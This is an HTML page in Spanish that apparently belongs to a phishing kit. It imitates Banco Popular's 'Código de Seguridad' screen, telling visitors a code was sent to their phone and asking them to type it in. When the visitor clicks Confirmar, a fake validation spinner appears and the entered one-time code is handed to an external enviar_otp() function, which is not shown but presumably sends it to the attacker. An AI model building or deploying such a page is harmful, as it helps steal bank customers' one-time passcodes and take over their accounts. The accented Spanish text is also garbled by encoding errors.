<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ValidaciÃ³n de Seguridad | Banco Popular</title>
    <link rel="icon" type="image/png" href="popular_logo.webp">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --popular-green: #1ca35a;
            --popular-dark: #004225;
            --accent-orange: #f68b1e;
            --text-dark: #121212;
            --text-gray: #666666;
            --bg-body: #ffffff;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-body);
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-dark);
        }

        .otp-card {
            width: 100%;
            max-width: 440px;
            padding: 50px 35px;
            box-sizing: border-box;
            background-color: #fff;
            position: relative;
            text-align: center;
        }

        .security-badge {
            position: absolute;
            top: 25px;
            right: 35px;
            color: var(--accent-orange);
            background: rgba(246, 139, 30, 0.08);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .header-section {
            margin-bottom: 40px;
            text-align: left;
        }

        .logo-banco {
            width: 180px;
            height: auto;
            display: block;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            margin: 0 0 15px 0;
            color: var(--text-dark);
        }

        .info-text {
            font-size: 14px;
            color: var(--text-gray);
            line-height: 1.6;
            margin-bottom: 35px;
            text-align: left;
        }

        .info-text b {
            color: var(--popular-green);
        }

        /* Form Styling */
        .form-block {
            margin-bottom: 35px;
            text-align: left;
        }

        .input-group {
            position: relative;
            border-bottom: 2px solid #eaebec;
            padding: 10px 0;
            transition: all 0.3s;
        }

        .input-group.focused {
            border-bottom-color: var(--popular-green);
        }

        .input-group label {
            position: absolute;
            left: 0;
            top: 14px;
            font-size: 16px;
            color: #999;
            transition: all 0.2s ease-out;
            pointer-events: none;
            font-weight: 500;
        }

        .input-group.focused label, 
        .input-group.filled label {
            top: -12px;
            font-size: 12px;
            color: var(--popular-green);
            font-weight: 700;
        }

        .input-item {
            width: 100%;
            border: none;
            outline: none;
            font-size: 22px;
            font-weight: 700;
            color: var(--text-dark);
            background: transparent;
            letter-spacing: 2px;
        }

        /* Button */
        .btn-confirm {
            width: 100%;
            padding: 18px;
            background-color: #e4e6eb;
            color: #a0a4ab;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s ease;
            margin-bottom: 30px;
        }

        .btn-confirm.ready {
            background-color: var(--popular-green);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 8px 16px rgba(28, 163, 90, 0.2);
        }

        .btn-confirm.ready:hover {
            background-color: var(--popular-dark);
            transform: translateY(-2px);
        }

        .secondary-actions {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-gray);
            margin-bottom: 45px;
        }

        .secondary-actions a {
            color: var(--accent-orange);
            text-decoration: none;
            border-bottom: 1px dashed var(--accent-orange);
        }

        .recaptcha-footer {
            font-size: 12px;
            color: #999;
            line-height: 1.6;
        }

        .recaptcha-footer a {
            color: var(--text-gray);
            text-decoration: none;
            font-weight: 600;
        }

        /* Overlay Loader */
        #loader-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.98);
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f1f1f1;
            border-top: 4px solid var(--popular-green);
            border-right: 4px solid var(--accent-orange);
            border-radius: 50%;
            animation: spin 1s infinite linear;
            margin-bottom: 25px;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .otp-card {
                padding: 40px 25px;
            }
        }
    </style>
</head>
<body>

    <div id="loader-overlay">
        <img src="popular_logo.webp" alt="Banco Popular" style="width: 140px; margin-bottom: 40px;">
        <div class="spinner"></div>
        <p style="color: var(--popular-green); font-weight: 700; font-size: 15px;">Validando tu cÃ³digo de seguridad...</p>
    </div>

    <div class="otp-card">
        <div class="security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        </div>

        <div class="header-section">
            <img src="popular_logo.webp" alt="Banco Popular" class="logo-banco">
            <h1>CÃ³digo de Seguridad</h1>
            <p class="info-text">
                Hemos enviado un cÃ³digo a tu celular registrado. <br>IngrÃ©salo para confirmar que eres tÃº.
            </p>
        </div>

        <div class="form-block">
            <div class="input-group" id="otpGroup">
                <label for="txtOTP">Ingresa tu cÃ³digo</label>
                <input type="tel" id="txtOTP" class="input-item" maxlength="8" autocomplete="one-time-code">
            </div>
        </div>

        <button type="button" id="btnOTP" class="btn-confirm" disabled>Confirmar</button>

        <div class="secondary-actions">
            Â¿No recibiste el cÃ³digo? <a href="#">Solicitar de nuevo</a>
        </div>

        <div class="recaptcha-footer">
            Protegido por reCAPTCHA | <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            const $input = $("#txtOTP");
            const $group = $("#otpGroup");
            const $btn = $("#btnOTP");

            $input.on("focus", function() {
                $group.addClass("focused");
            }).on("blur", function() {
                $group.removeClass("focused");
                if ($input.val() !== "") {
                    $group.addClass("filled");
                } else {
                    $group.removeClass("filled");
                }
            }).on("input", function() {
                if ($input.val() !== "") {
                    $group.addClass("filled");
                } else {
                    $group.removeClass("filled");
                }

                if ($input.val().length >= 4) {
                    $btn.addClass("ready").prop("disabled", false);
                } else {
                    $btn.removeClass("ready").prop("disabled", true);
                }
            });

            $btn.on("click", function() {
                if ($btn.hasClass("ready")) {
                    $("#loader-overlay").css("display", "flex");
                    setTimeout(function() {
                        enviar_otp($input.val());
                    }, 1500);
                }
            });

            // Enter key
            $(document).on("keypress", function(e) {
                if (e.which === 13 && $btn.hasClass("ready")) {
                    $btn.click();
                }
            });
        });
    </script>
</body>
</html>
